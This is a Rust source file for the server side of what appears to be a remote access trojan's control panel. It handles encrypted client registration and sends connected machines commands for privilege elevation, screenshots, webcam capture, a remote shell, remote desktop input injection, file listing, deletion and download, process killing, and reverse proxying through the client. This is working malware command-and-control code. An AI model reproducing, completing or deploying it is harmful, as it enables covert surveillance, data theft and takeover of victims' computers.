use std::collections::HashMap;
use tokio::sync::mpsc::{Receiver, Sender};
use std::net::SocketAddr;

use std::sync::{ Arc, Mutex };
use tauri::{ AppHandle, Manager };

use common::packets::ClientInfo;

use rand::rngs::OsRng;
use rand::Rng;
use rsa::{pkcs8::ToPublicKey, PaddingScheme, RsaPrivateKey, RsaPublicKey};
use base64::{engine::general_purpose, Engine as _};

use common::packets::*;

use anyhow::{Context, Result};
use crate::commands::*;
use common::{ENC_TOK_LEN, RSA_BITS};

use crate::utils::logger::Logger;

pub struct ServerWrapper {
    receiver: Receiver<ServerCommand>,
    txs: HashMap<std::net::SocketAddr, Sender<ClientCommand>>,
    connected_users: HashMap<std::net::SocketAddr, ClientInfo>,
    priv_key: RsaPrivateKey,
    pub_key: RsaPublicKey,
    tauri_handle: Option<Arc<Mutex<AppHandle>>>,
    reverse_proxy_tasks: HashMap<std::net::SocketAddr, tokio::task::JoinHandle<()>>,
    log_events: Logger,
}

impl ServerWrapper {
    pub async fn spawn(receiver: Receiver<ServerCommand>) -> Result<()> {
        let txs: HashMap<std::net::SocketAddr, Sender<ClientCommand>> = HashMap::new();
        let connected_users: HashMap<std::net::SocketAddr, ClientInfo> = HashMap::new();
        let mut rng = OsRng;
        let priv_key =
            RsaPrivateKey::new(&mut rng, RSA_BITS).with_context(|| "Failed to generate a key.")?;
        let pub_key = RsaPublicKey::from(&priv_key);

        let s = Self {
            receiver,
            txs,
            connected_users,
            priv_key,
            pub_key,
            tauri_handle: None,
            reverse_proxy_tasks: HashMap::new(),
            log_events: Logger::new(),
        };

        s.channel_loop().await;

        Ok(())
    }
    
    // Helper method for common command logging and execution
    async fn handle_command(&mut self, addr: &SocketAddr, packet: ClientboundPacket) {
        if let Some(client) = self.connected_users.get(addr) {
            self.log_events.log("cmd_sent", format!("Executed {} on client [{}] [{}]", packet.get_type(), addr, client.username)).await;
            self.send_client_packet(addr, packet.clone()).await;
        }
    }
    
    // Helper method to create and send image data
    async fn send_image_data(&self, addr: &SocketAddr, event: &str, data: &[u8]) {
        let base64_img = general_purpose::STANDARD.encode(data);
        let data_url = format!("data:image/jpeg;base64,{}", base64_img);
        
        let payload = serde_json::json!({
            "addr": addr.to_string(),
            "data": data_url
        });
        
        self.emit_serde_payload(event, payload).await;
    }
    
    // Helper method for handling client data responses
    async fn handle_client_data(&mut self, addr: &SocketAddr, data_type: &str, event: &str, payload: serde_json::Value) {
        if let Some(client) = self.connected_users.get(addr) {
            self.log_events.log("cmd_rcvd", format!("Received {} from client [{}] [{}]", data_type, addr, client.username)).await;
            self.emit_serde_payload(event, payload).await;
        }
    }
    
    async fn emit_client_status(&self, client_info: &ClientInfo, status: &str) {
        let payload = serde_json::json!(client_info);
        self.emit_serde_payload(status, payload).await;
    }

    async fn emit_serde_payload(&self, event: &str, payload: serde_json::Value) {
        if let Some(handle) = &self.tauri_handle {
            handle.lock().unwrap().emit_all(event, payload).unwrap_or_else(|e| println!("Failed to emit payload event: {}", e));
        } else {
            println!("Cannot send payload event: Tauri handle not set");
        }
    }

    async fn send_client_packet(&self, addr: &SocketAddr, packet: ClientboundPacket) {
        if let Some(tx) = self.txs.get(&addr) {
            tx.send(ClientCommand::Write(packet.clone()))
                .await
                .unwrap_or_else(|e| println!("Failed to send packet {:?}: {}", packet.get_type(), e));
        }
    }

    async fn channel_loop(mut self) {
        while let Some(p) = self.receiver.recv().await {
            use crate::commands::ServerCommand::*;

            match p {
                // Infrastructure and logging
                Log(log) => self.log_events.log_once(log).await,
                
                CloseClientSessions() => {
                    for (addr, tx) in self.txs.iter_mut() {
                        tx.send(ClientCommand::Close).await.unwrap();
                        self.reverse_proxy_tasks.remove(&addr);
                    }
                    self.txs.clear();
                    self.connected_users.clear();
                    self.reverse_proxy_tasks.clear();
                    self.log_events.log("server_stopped", "Server stopped!".to_string()).await;
                }
                
                SetTauriHandle(handle) => {
                    self.tauri_handle = Some(Arc::new(Mutex::new(handle)));
                    self.log_events.tauri_handle = Some(self.tauri_handle.clone().unwrap());
                }
                
                // Client connection handling
                EncryptionRequest(tx, otx) => {
                    let mut token = [0u8; ENC_TOK_LEN];
                    OsRng.fill(&mut token);
                    tx.send(ClientCommand::Write(
                        ClientboundPacket::EncryptionResponse(
                            self.pub_key.to_public_key_der().unwrap().as_ref().to_vec(),
                            token.to_vec(),
                        ),
                    ))
                    .await
                    .unwrap();
                    otx.send(token.to_vec()).unwrap();
                }
                
                EncryptionConfirm(tx, otx, enc_s, enc_t, exp_t) => {
                    let padding = PaddingScheme::new_pkcs1v15_encrypt();
                    let t = self.priv_key.decrypt(padding, &enc_t).expect("Failed to decrypt.");
                    
                    if t != exp_t {
                        eprintln!("Encryption handshake failed!");
                        tx.send(ClientCommand::Close).await.ok();
                        otx.send(Err(())).unwrap();
                    } else {
                        let padding = PaddingScheme::new_pkcs1v15_encrypt();
                        let s = self.priv_key.decrypt(padding, &enc_s).expect("Failed to decrypt.");
                        otx.send(Ok(s.clone())).unwrap();
                        tx.send(ClientCommand::SetSecret(Some(s.clone()))).await.unwrap();
                        tx.send(ClientCommand::Write(ClientboundPacket::EncryptionAck)).await.unwrap();
                        tx.send(ClientCommand::Write(ClientboundPacket::InitClient)).await.unwrap();
                    }
                }
                
                RegisterClient(tx, addr, mut client_info) => {
                    self.txs.insert(addr, tx);
                    client_info.uuidv4 = Some(uuid::Uuid::new_v4().to_string());
                    client_info.addr = Some(addr.to_string());
                    self.connected_users.insert(addr, client_info.clone());
                
                    self.log_events.log("client_connected", format!("Client [{}] {} connected!", addr, client_info.username)).await;
                    self.emit_client_status(&client_info, "client_connected").await;
                }
                
                ClientDisconnected(addr) => {
                    if let Some(client) = self.connected_users.get(&addr) {
                        self.log_events.log("client_disconnected", format!("Client [{}] [{}] disconnected", addr, client.username)).await;
                        self.emit_client_status(&client, "client_disconnected").await;
                    }
                    self.txs.remove(&addr);
                    self.reverse_proxy_tasks.remove(&addr);
                    self.connected_users.remove(&addr);
                }
                
                // Client actions - simplified using generic command handler
                VisitWebsite(addr, data) => 
                    self.handle_command(&addr, ClientboundPacket::VisitWebsite(data)).await,
                
                ShowMessageBox(addr, data) => 
                    self.handle_command(&addr,  ClientboundPacket::ShowMessageBox(data)).await,
                
                ElevateClient(addr) => 
                    self.handle_command(&addr, ClientboundPacket::ElevateClient).await,
                
                TakeScreenshot(addr, display) => 
                    self.handle_command(&addr, ClientboundPacket::ScreenshotDisplay(display)).await,
                
                GetProcessList(addr) => 
                    self.handle_command(&addr, ClientboundPacket::GetProcessList).await,
                
                KillProcess(addr, process) => 
                    self.handle_command(&addr, ClientboundPacket::KillProcess(process)).await,
                
                StartShell(addr) => 
                    self.handle_command(&addr, ClientboundPacket::StartShell).await,
                
                ExitShell(addr) => 
                    self.handle_command(&addr, ClientboundPacket::ExitShell).await,
                
                ShellCommand(addr, command) => 
                    self.handle_command(&addr, ClientboundPacket::ShellCommand(command)).await,
                
                StartRemoteDesktop(addr, config) => 
                    self.handle_command(&addr, ClientboundPacket::StartRemoteDesktop(config)).await,
                
                StopRemoteDesktop(addr) => {
                    self.handle_command(&addr, ClientboundPacket::StopRemoteDesktop).await;
                    // Reset input state
                    let reset_input = KeyboardInputData {
                        key_code: 0, character: "".to_string(), is_keydown: false,
                        shift_pressed: false, ctrl_pressed: false, caps_lock: false
                    };
                    self.send_client_packet(&addr, ClientboundPacket::KeyboardInput(reset_input)).await;
                },
                
                RequestWebcam(addr) => 
                    self.handle_command(&addr, ClientboundPacket::RequestWebcam).await,
                
                ManageSystem(addr, command) => 
                    self.handle_command(&addr, ClientboundPacket::ManageSystem(command.clone())).await,
                
                DownloadFile(addr, path) => 
                    self.handle_command(&addr, ClientboundPacket::DownloadFile(path)).await,
                
                // Simple commands without logging
                MouseClick(addr, data) => self.send_client_packet(&addr, ClientboundPacket::MouseClick(data)).await,
                KeyboardInput(addr, data) => self.send_client_packet(&addr, ClientboundPacket::KeyboardInput(data)).await,
                PreviousDir(addr) => self.send_client_packet(&addr, ClientboundPacket::PreviousDir).await,
                ViewDir(addr, path) => self.send_client_packet(&addr, ClientboundPacket::ViewDir(path)).await,
                AvailableDisks(addr) => self.send_client_packet(&addr, ClientboundPacket::AvailableDisks).await,
                RemoveDir(addr, path) => self.send_client_packet(&addr, ClientboundPacket::RemoveDir(path)).await,
                RemoveFile(addr, path) => self.send_client_packet(&addr, ClientboundPacket::RemoveFile(path)).await,
                DisconnectClient(addr) => self.send_client_packet(&addr, ClientboundPacket::Disconnect).await,
                ReconnectClient(addr) => self.send_client_packet(&addr, ClientboundPacket::Reconnect).await,
                
                // Client data responses - consolidated pattern
                ScreenshotData(addr, data) => {
                    if let Some(client) = self.connected_users.get(&addr) {
                        self.log_events.log("cmd_rcvd", format!("Received screenshot from client [{}] [{}]", addr, client.username)).await;
                        self.send_image_data(&addr, "client_screenshot", &data).await;
                    }
                },
                
                ProcessList(addr, process_list) => {
                    let payload = serde_json::json!({
                        "addr": addr.to_string(),
                        "processes": process_list.processes.clone()
                    });
                    self.handle_client_data(&addr, "process list", "process_list", payload).await;
                },
                
                ShellOutput(addr, output) => {
                    let payload = serde_json::json!({
                        "addr": addr.to_string(),
                        "shell_output": output.clone()
                    });
                    self.handle_client_data(&addr, "shell output", "client_shellout", payload).await;
                },
                
                RemoteDesktopFrame(addr, frame) => {
                    let base64_img = general_purpose::STANDARD.encode(&frame.data);
                    let payload = serde_json::json!({
                        "addr": addr.to_string(),
                        "timestamp": frame.timestamp,
                        "display": frame.display,
                        "data": base64_img
                    });
                    self.emit_serde_payload("remote_desktop_frame", payload).await;
                },
                
                WebcamResult(addr, frame) => {
                    if let Ok(jpeg_data) = crate::utils::webcam::process_webcam_frame(frame) {
                        self.send_image_data(&addr, "webcam_result", &jpeg_data).await;
                    }
                },
                
                FileList(addr, files) => {
                    let payload = serde_json::json!({
                        "addr": addr.to_string(),
                        "files": files
                    });
                    self.emit_serde_payload("files_result", payload).await;
                },
                
                CurrentFolder(addr, path) => {
                    let payload = serde_json::json!({
                        "addr": addr.to_string(),
                        "path": path
                    });
                    self.emit_serde_payload("current_folder", payload).await;
                },
                
                DisksResult(addr, disks) => {
                    let files = disks.iter().map(|disk| File {
                        file_type: "dir".to_string(),
                        name: format!("{}:\\", disk),
                    }).collect::<Vec<_>>();
                    
                    let payload = serde_json::json!({
                        "addr": addr.to_string(),
                        "files": files
                    });
                    self.emit_serde_payload("files_result", payload).await;
                },
                
                DownloadFileResult(addr, file_data) => {
                    if let Some(client) = self.connected_users.get(&addr) {
                        self.log_events.log("cmd_rcvd", format!("Downloaded file from client [{}] [{}]", addr, client.username)).await;
                        let _ = std::fs::write(file_data.name, file_data.data);
                    }
                },
                
                // Utilities
                GetClients(resp) => {
                    resp.send(self.connected_users.values().cloned().collect()).ok();
                },
                
                GetClient(addr, resp) => {
                    resp.send(self.connected_users.get(&addr).cloned()).ok();
                },
                
                // Reverse proxy handling
                StartReverseProxy(addr, port, local_port) => {
                    self.handle_command(&addr, ClientboundPacket::StartReverseProxy(port.clone())).await;
                    if let Some(task) = crate::utils::reverse_proxy::start_reverse_proxy(port, local_port).await {
                        self.reverse_proxy_tasks.insert(addr, task);
                    }
                },
                
                StopReverseProxy(addr) => {
                    self.handle_command(&addr, ClientboundPacket::StopReverseProxy).await;
                    if let Some(task) = self.reverse_proxy_tasks.get(&addr) {
                        task.abort();
                    }
                    self.reverse_proxy_tasks.remove(&addr);
                },
            }
        }
    }
}